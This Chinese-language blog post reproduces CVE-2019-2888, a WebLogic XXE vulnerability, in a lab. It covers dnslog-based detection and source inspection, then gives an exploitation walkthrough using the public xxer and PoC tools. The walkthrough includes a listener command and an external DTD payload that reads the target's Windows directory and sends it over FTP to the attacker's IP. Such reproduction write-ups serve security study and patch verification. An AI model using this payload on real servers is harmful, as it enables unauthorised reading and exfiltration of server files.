---
title: (CVE-2019-2888)weblogic-XXE漏洞复现
tags: 
  - XXE
  - weblogic
  -	漏洞复现
  -	CVE-2019-2888
categories: 漏洞复现
keywords: 'XXE,weblogic,漏洞复现,CVE-2019-2888'
description: (CVE-2019-2888)weblogic-XXE漏洞复现
cover: /images/17/3.png
date: 2020-10-02 10:45:41
type: categories
---



本篇文章将带来weblogic的xxe漏洞CVE-2019-2888的漏洞利用方式	
环境搭建请参考这一篇文章

https://j-jasson2.github.io/2020/09/30/Windows搭建weblogic环境/

# 漏洞检测
## 黑盒审计
1、端口+服务+版本
![upload successful](/images/17/1.png) 
![upload successful](/images/17/2.png) 
![upload successful](/images/17/3.png) 
![upload successful](/images/17/4.png) 

2、首先使用在线工具获取一个dnslog地址
![upload successful](/images/17/5.png) 

3、使用CVE-2019-2888调用外部的我们获取的dnslog地址
![upload successful](/images/17/6.png) 

4、回去查看日志，已经成功获取了日志，说明这里可能存在CVE-2019-2888漏洞
![upload successful](/images/17/7.png) 

## 白盒审计
在源码中的
\weblogic\servlet\ejb2jsp\dd\EJBTaglibDescriptor.class这个类继承自java\io\Externalizable
如果没有对该类进行**disableXXEOnDocumentBuilderFactory**处理，即存在CVE-2019-2888 漏洞。
![upload successful](/images/17/8.png) 

# 漏洞复现
工具：	
xxer：	
https://github.com/TheTwitchy/xxer	
CVE-2019-2888	
https://github.com/jas502n/CVE-2019-2888

1、首先攻击机下载好工具，打开xxer，开始监听数据
```
python xxer.py -p 8989 -H 192.168.159.129
```
![upload successful](/images/17/9.png)

2、打开xxer文件目录下的ext.dtd，输入以下内容，需要修改的地方为读取靶机的内容的路径以及攻击机的ip。
```
<!ENTITY % bbb SYSTEM "file:///Windows/"><!ENTITY % ccc "<!ENTITY &#37; ddd SYSTEM 'ftp://fakeuser:%bbb;@192.168.159.129:2121/b'>">
```
![upload successful](/images/17/10.png)

3、新打开一个终端，路径为CVE-2019-2888的文件夹中。运行命令，会让你输入攻击机的IP与端口，我这里分别是192.168.159.129和8989
![upload successful](/images/17/11.png)  

4、回到之前xxer的监听界面，获取了靶机的/Windows路径下的所有文件信息
![upload successful](/images/17/12.png) 

